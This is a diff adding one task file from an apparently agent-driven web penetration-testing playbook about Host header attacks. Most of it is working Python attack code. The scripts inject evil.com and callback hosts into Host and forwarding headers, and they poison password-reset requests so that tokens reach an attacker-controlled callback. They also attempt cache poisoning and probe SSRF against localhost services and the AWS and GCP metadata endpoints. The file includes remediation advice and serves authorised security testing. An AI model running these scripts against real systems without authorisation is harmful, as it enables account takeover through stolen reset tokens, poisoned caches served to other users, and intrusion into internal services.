@@ -1,0 +1,642 @@
+================================================================================
+TASK 96 - HOST HEADER ATTACKS
+================================================================================
+Covers testing_toolkit.txt Phase 15 Step 51
+Host header manipulation for various attacks
+
+HOST HEADER = TRUSTED BUT ATTACKER-CONTROLLED
+Applications often trust the Host header for:
+- Password reset links
+- Redirect URLs
+- Cache keys
+- Virtual host routing
+
+Manipulate it → serious consequences.
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/url_corpus_all_in_scope.txt        <- URL corpus
+outputs/har/accounts/*_auth.json           <- Auth tokens
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/host_header/
+    vulnerable_endpoints.txt               <- Host header vulnerable endpoints
+    password_reset_poisoning.txt           <- Password reset link poisoning
+    cache_poisoning.txt                    <- Host-based cache poisoning
+    ssrf_via_host.txt                      <- SSRF via Host header
+    routing_bypass.txt                     <- Virtual host routing bypass
+
+outputs/vulnerabilities/HOST-HEADER-*-HIGH.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND HOST HEADER ATTACKS:
+
+    Why Host header matters:
+    |
+    +-- Password Reset Poisoning
+    |   +-- App generates reset link using Host header
+    |   +-- Attacker: Host: evil.com
+    |   +-- Reset link: https://evil.com/reset?token=xxx
+    |   +-- Victim clicks → token sent to attacker!
+    |
+    +-- Web Cache Poisoning
+    |   +-- Cache keys by URL, ignores Host
+    |   +-- Poison response with manipulated Host
+    |   +-- All users get poisoned response
+    |
+    +-- SSRF via Host
+    |   +-- Backend uses Host for internal requests
+    |   +-- Host: internal-service:8080
+    |   +-- Backend connects to internal service!
+    |
+    +-- Virtual Host Confusion
+    |   +-- Multiple apps on same IP
+    |   +-- Wrong Host → access different app
+    |   +-- Bypass access controls
+
+    Headers to test:
+    |
+    +-- Host: evil.com
+    +-- X-Forwarded-Host: evil.com
+    +-- X-Host: evil.com
+    +-- X-Forwarded-Server: evil.com
+    +-- X-HTTP-Host-Override: evil.com
+    +-- Forwarded: host=evil.com
+
+================================================================================
+PHASE 1: HOST HEADER REFLECTION
+================================================================================
+
+-----------------------------------------
+1.1 Test Host Header Reflection
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+host_header_scanner.py - Test for Host header vulnerabilities
+"""
+
+import requests
+import re
+import os
+from urllib.parse import urlparse
+
+os.makedirs('outputs/host_header', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class HostHeaderScanner:
+    
+    # Headers that can override Host
+    HOST_OVERRIDE_HEADERS = [
+        'Host',
+        'X-Forwarded-Host',
+        'X-Host',
+        'X-Forwarded-Server',
+        'X-HTTP-Host-Override',
+        'X-Original-Host',
+        'X-Rewrite-URL',
+    ]
+    
+    def __init__(self, callback_domain):
+        self.callback = callback_domain
+        self.session = requests.Session()
+        self.vulnerable = []
+    
+    def test_host_reflection(self, url):
+        """Test if Host header is reflected in response"""
+        
+        findings = []
+        evil_host = f"evil-{self.callback}"
+        
+        for header in self.HOST_OVERRIDE_HEADERS:
+            headers = {header: evil_host}
+            
+            try:
+                resp = self.session.get(
+                    url,
+                    headers=headers,
+                    timeout=15,
+                    verify=False,
+                    allow_redirects=False
+                )
+                
+                # Check response body
+                if evil_host in resp.text:
+                    findings.append({
+                        'url': url,
+                        'header': header,
+                        'type': 'body_reflection',
+                        'evidence': f'Host reflected in body'
+                    })
+                
+                # Check Location header (redirects)
+                location = resp.headers.get('Location', '')
+                if evil_host in location:
+                    findings.append({
+                        'url': url,
+                        'header': header,
+                        'type': 'redirect_reflection',
+                        'evidence': f'Location: {location}'
+                    })
+                
+                # Check Set-Cookie
+                cookies = resp.headers.get('Set-Cookie', '')
+                if evil_host in cookies:
+                    findings.append({
+                        'url': url,
+                        'header': header,
+                        'type': 'cookie_reflection',
+                        'evidence': f'Host in Set-Cookie'
+                    })
+                    
+            except:
+                continue
+        
+        return findings
+    
+    def test_password_reset_poisoning(self, url):
+        """Test password reset for Host header poisoning"""
+        
+        # Common password reset endpoints
+        reset_endpoints = [
+            '/password/reset',
+            '/forgot-password',
+            '/reset-password',
+            '/auth/forgot',
+            '/api/auth/reset',
+            '/users/password/new',
+            '/account/recover',
+        ]
+        
+        base = url.rstrip('/')
+        findings = []
+        
+        for endpoint in reset_endpoints:
+            reset_url = f"{base}{endpoint}"
+            
+            for header in ['Host', 'X-Forwarded-Host']:
+                headers = {header: self.callback}
+                
+                # Try POST with email
+                try:
+                    resp = self.session.post(
+                        reset_url,
+                        json={'email': 'test@example.com'},
+                        headers=headers,
+                        timeout=15,
+                        verify=False
+                    )
+                    
+                    # Check if request was accepted
+                    if resp.status_code in [200, 201, 202, 204]:
+                        findings.append({
+                            'url': reset_url,
+                            'header': header,
+                            'type': 'password_reset_poisoning',
+                            'note': 'Check OOB callback for reset link'
+                        })
+                        
+                except:
+                    continue
+        
+        return findings
+
+================================================================================
+PHASE 2: CACHE POISONING VIA HOST
+================================================================================
+
+-----------------------------------------
+2.1 Host-Based Cache Poisoning
+-----------------------------------------
+def test_cache_poisoning_host(url, evil_host):
+    """Test for cache poisoning via Host header"""
+    
+    session = requests.Session()
+    
+    # First request with evil Host
+    headers = {'Host': evil_host}
+    
+    try:
+        resp1 = session.get(url, headers=headers, timeout=15, verify=False)
+        
+        # Second request with normal Host (should get cached response)
+        resp2 = session.get(url, timeout=15, verify=False)
+        
+        # Check if evil host appears in second response (cached)
+        if evil_host in resp2.text:
+            return {
+                'url': url,
+                'type': 'host_cache_poisoning',
+                'evidence': 'Evil host reflected in cached response'
+            }
+            
+    except:
+        pass
+    
+    return None
+
+-----------------------------------------
+2.2 Cache Key Confusion
+-----------------------------------------
+"""
+CACHE KEY CONFUSION:
+
+Normal cache key: scheme + host + path + query
+Some caches: scheme + path + query (ignores Host!)
+
+Attack:
+1. Request with Host: evil.com → response contains evil.com
+2. Cache stores response for /path
+3. Next user requests /path → gets poisoned response!
+
+Test by:
+1. Send request with evil Host
+2. Send normal request immediately
+3. Check if evil Host appears in second response
+"""
+
+================================================================================
+PHASE 3: SSRF VIA HOST HEADER
+================================================================================
+
+-----------------------------------------
+3.1 Internal Service Access
+-----------------------------------------
+def test_ssrf_via_host(url, internal_targets):
+    """Test SSRF via Host header"""
+    
+    session = requests.Session()
+    findings = []
+    
+    for target in internal_targets:
+        headers = {'Host': target}
+        
+        try:
+            resp = session.get(
+                url,
+                headers=headers,
+                timeout=15,
+                verify=False
+            )
+            
+            # Look for internal service indicators
+            internal_indicators = [
+                'localhost', '127.0.0.1', 'internal',
+                'admin', 'private', 'metadata',
+                '169.254.169.254',  # AWS metadata
+            ]
+            
+            for indicator in internal_indicators:
+                if indicator in resp.text.lower():
+                    findings.append({
+                        'url': url,
+                        'host': target,
+                        'type': 'ssrf_via_host',
+                        'evidence': f'Found: {indicator}'
+                    })
+                    break
+                    
+        except:
+            continue
+    
+    return findings
+
+# Internal targets to test
+INTERNAL_TARGETS = [
+    'localhost',
+    '127.0.0.1',
+    '127.0.0.1:8080',
+    '127.0.0.1:8443',
+    'localhost:3000',
+    'localhost:5000',
+    'localhost:9200',  # Elasticsearch
+    'localhost:6379',  # Redis
+    'localhost:27017', # MongoDB
+    '169.254.169.254', # AWS metadata
+    'metadata.google.internal', # GCP metadata
+    'internal-api',
+    'backend',
+    'admin',
+]
+
+================================================================================
+PHASE 4: VIRTUAL HOST ROUTING
+================================================================================
+
+-----------------------------------------
+4.1 Virtual Host Confusion
+-----------------------------------------
+def test_vhost_confusion(ip, hostnames):
+    """Test virtual host routing issues"""
+    
+    session = requests.Session()
+    responses = {}
+    
+    for hostname in hostnames:
+        headers = {'Host': hostname}
+        
+        try:
+            resp = session.get(
+                f"https://{ip}/",
+                headers=headers,
+                timeout=15,
+                verify=False
+            )
+            
+            # Store response hash for comparison
+            response_hash = hash(resp.text[:1000])
+            
+            if response_hash not in responses:
+                responses[response_hash] = []
+            responses[response_hash].append({
+                'hostname': hostname,
+                'status': resp.status_code,
+                'length': len(resp.text)
+            })
+            
+        except:
+            continue
+    
+    # If different hostnames give different responses,
+    # virtual hosting is in use
+    if len(responses) > 1:
+        return {
+            'ip': ip,
+            'virtual_hosts': responses,
+            'note': 'Multiple virtual hosts detected'
+        }
+    
+    return None
+
+================================================================================
+PHASE 5: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+host_header_complete.py - Complete Host header attack testing
+"""
+
+import os
+import json
+import requests
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+os.makedirs('outputs/host_header', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class HostHeaderAudit:
+    
+    def __init__(self, callback_domain):
+        self.callback = callback_domain
+        self.session = requests.Session()
+        self.findings = []
+    
+    def test_url(self, url):
+        """Test single URL for Host header issues"""
+        
+        results = []
+        evil_host = f"evil.{self.callback}"
+        
+        headers_to_test = [
+            ('Host', evil_host),
+            ('X-Forwarded-Host', evil_host),
+            ('X-Host', evil_host),
+        ]
+        
+        for header_name, header_value in headers_to_test:
+            try:
+                resp = self.session.get(
+                    url,
+                    headers={header_name: header_value},
+                    timeout=15,
+                    verify=False,
+                    allow_redirects=False
+                )
+                
+                # Check for reflection
+                if evil_host in resp.text:
+                    results.append({
+                        'url': url,
+                        'header': header_name,
+                        'type': 'body_reflection',
+                        'severity': 'MEDIUM'
+                    })
+                
+                if evil_host in resp.headers.get('Location', ''):
+                    results.append({
+                        'url': url,
+                        'header': header_name,
+                        'type': 'redirect_poisoning',
+                        'severity': 'HIGH'
+                    })
+                    
+            except:
+                continue
+        
+        return results
+    
+    def test_password_reset(self, base_url):
+        """Test password reset for Host poisoning"""
+        
+        reset_paths = [
+            '/password/reset', '/forgot-password', '/reset-password',
+            '/auth/forgot', '/api/auth/reset-password'
+        ]
+        
+        results = []
+        
+        for path in reset_paths:
+            url = f"{base_url.rstrip('/')}{path}"
+            
+            try:
+                resp = self.session.post(
+                    url,
+                    json={'email': 'test@example.com'},
+                    headers={'Host': self.callback},
+                    timeout=15,
+                    verify=False
+                )
+                
+                if resp.status_code in [200, 201, 202, 204]:
+                    results.append({
+                        'url': url,
+                        'type': 'password_reset_poisoning',
+                        'severity': 'HIGH',
+                        'note': 'Monitor callback for reset token'
+                    })
+                    
+            except:
+                continue
+        
+        return results
+    
+    def test_ssrf(self, url):
+        """Test SSRF via Host header"""
+        
+        internal_hosts = [
+            'localhost', '127.0.0.1', '169.254.169.254',
+            'localhost:8080', 'internal-api'
+        ]
+        
+        results = []
+        
+        for host in internal_hosts:
+            try:
+                resp = self.session.get(
+                    url,
+                    headers={'Host': host},
+                    timeout=15,
+                    verify=False
+                )
+                
+                # Look for internal content
+                internal_indicators = [
+                    'localhost', 'internal', 'private',
+                    'metadata', 'admin', 'aws', 'gcp'
+                ]
+                
+                for indicator in internal_indicators:
+                    if indicator in resp.text.lower():
+                        results.append({
+                            'url': url,
+                            'host': host,
+                            'type': 'ssrf_via_host',
+                            'severity': 'HIGH'
+                        })
+                        break
+                        
+            except:
+                continue
+        
+        return results
+    
+    def scan_all(self, urls, threads=10):
+        """Scan all URLs"""
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            # Host reflection tests
+            futures = {executor.submit(self.test_url, url): url 
+                      for url in urls}
+            
+            for future in as_completed(futures):
+                results = future.result()
+                self.findings.extend(results)
+        
+        # Test password reset on base URLs
+        base_urls = list(set([
+            f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+            for url in urls
+        ]))
+        
+        for base in base_urls:
+            results = self.test_password_reset(base)
+            self.findings.extend(results)
+            
+            results = self.test_ssrf(base)
+            self.findings.extend(results)
+    
+    def generate_reports(self):
+        """Generate vulnerability reports"""
+        
+        high_findings = [f for f in self.findings 
+                        if f.get('severity') == 'HIGH']
+        
+        for i, finding in enumerate(high_findings):
+            report = f"""# Host Header Attack
+
+**URL**: {finding['url']}
+**Type**: {finding['type']}
+**Severity**: HIGH
+
+## Description
+The application is vulnerable to Host header manipulation.
+{'The Host header is reflected in password reset links.' if 'password' in finding['type']
+ else 'The Host header is processed in a dangerous way.'}
+
+## Impact
+{'Attacker can capture password reset tokens.' if 'password' in finding['type']
+ else 'Various attacks possible including SSRF and cache poisoning.'}
+
+## PoC
+```http
+GET / HTTP/1.1
+Host: evil-attacker.com
+```
+
+## Remediation
+1. Validate Host header against whitelist
+2. Use SERVER_NAME instead of Host header
+3. Configure web server to reject unknown hosts
+"""
+            
+            with open(f'outputs/vulnerabilities/HOST-HEADER-{i}-HIGH.md', 'w') as f:
+                f.write(report)
+    
+    def save_results(self):
+        """Save all results"""
+        
+        with open('outputs/host_header/vulnerable_endpoints.txt', 'w') as f:
+            for finding in self.findings:
+                f.write(f"{finding['type']}|{finding['url']}\n")
+        
+        # By type
+        password_reset = [f for f in self.findings 
+                        if 'password' in f.get('type', '')]
+        with open('outputs/host_header/password_reset_poisoning.txt', 'w') as f:
+            for finding in password_reset:
+                f.write(f"{finding['url']}\n")
+        
+        ssrf = [f for f in self.findings if 'ssrf' in f.get('type', '')]
+        with open('outputs/host_header/ssrf_via_host.txt', 'w') as f:
+            for finding in ssrf:
+                f.write(f"{finding['url']}|{finding.get('host', '')}\n")
+        
+        with open('outputs/host_header/findings.json', 'w') as f:
+            json.dump(self.findings, f, indent=2)
+
+# Run
+if __name__ == "__main__":
+    # Get callback domain
+    with open('outputs/interactsh_id.txt') as f:
+        callback = f.read().strip()
+    
+    with open('outputs/url_corpus_all_in_scope.txt') as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    print(f"[*] Testing {len(urls)} URLs for Host header attacks...")
+    
+    audit = HostHeaderAudit(callback)
+    audit.scan_all(urls)
+    audit.save_results()
+    audit.generate_reports()
+    
+    print(f"\n[*] Host header findings: {len(audit.findings)}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] Host header reflection tested
+[ ] X-Forwarded-Host tested
+[ ] Password reset poisoning tested
+[ ] Cache poisoning via Host tested
+[ ] SSRF via Host tested
+[ ] Virtual host confusion tested
+[ ] All HIGH findings have reports
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 97: Open Redirect (Phase 15 - Misc Advanced)
